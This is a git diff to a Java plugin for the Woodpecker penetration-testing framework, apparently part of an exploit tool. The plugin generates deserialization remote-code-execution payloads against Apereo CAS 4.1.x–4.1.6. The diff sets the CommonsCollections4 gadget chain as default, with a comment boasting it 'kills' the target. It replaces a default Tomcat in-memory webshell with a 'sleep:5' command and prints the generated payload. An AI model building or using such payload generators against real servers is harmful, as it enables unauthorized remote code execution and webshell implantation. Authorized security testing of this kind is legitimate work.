@@ -1,6 +1,8 @@
 package me.gv7.woodpecker.plugin.payloads;
 
 import me.gv7.woodpecker.plugin.*;
+import me.gv7.woodpecker.plugin.utils.CasCommonUtils;
+
 import java.util.ArrayList;
 import java.util.List;
 import java.util.Map;
@@ -9,7 +11,7 @@ public class CasPayloadGenerate implements IPayloadGenerator {
     public static IResultOutput iResultOutput;
     @Override
     public String getPayloadTabCaption() {
-        return "CAS execute 反序列化生成器";
+        return "4.1.x-4.1.6 crypter";
     }
 
     @Override
@@ -17,31 +19,31 @@ public class CasPayloadGenerate implements IPayloadGenerator {
         IArgsUsageBinder binder = CasRCE.callbacks.getPluginHelper().createArgsUsageBinder();
         List<IArg> args = new ArrayList<>();
         final IArg gadge = CasRCE.callbacks.getPluginHelper().createArg();
-        gadge.setName("gadge");
+        gadge.setName("yso_gadget");
         gadge.setDefaultValue("CommonsCollections4");
         gadge.setRequired(true);
-        gadge.setDescription("cc链，默认用cc4就能打死");
+        gadge.setDescription("默认用cc4就能打死");
 
         final IArg shellType = CasRCE.callbacks.getPluginHelper().createArg();
-        shellType.setName("command");
-        shellType.setDefaultValue("TomcatFilterWebshell");
+        shellType.setName("yso_cmd");
+        shellType.setDefaultValue("sleep:5");
         shellType.setRequired(true);
-        shellType.setDescription("以后会添加spring的内存马");
+        shellType.setDescription("yoserial-for-woodpecker命令");
 
         args.add(gadge);
         args.add(shellType);
         binder.setArgsList(args);
-        binder.setUsage("gadge=URLDNS\nshell_type=http://www.baidu.com");
+        binder.setUsage("yso_gadget=URLDNS\nshell_type=http://www.baidu.com");
         return binder;
     }
 
     @Override
     public void generatorPayload(Map<String, Object> customArgs, IResultOutput result) {
         iResultOutput = result;
-        String className = (String)customArgs.get("gadge");
-        String command = (String)customArgs.get("command");
+        String className = (String)customArgs.get("yso_gadget");
+        String command = (String)customArgs.get("yso_cmd");
 
-        result.successPrintln(String.format("gadget: %s command: %s",className,command));
+        result.successPrintln("Generate execution parameter data success!");
         result.rawPrintln("\n");
         result.rawPrintln(CasCommonUtils.generate(className, command));
         result.rawPrintln("\n");
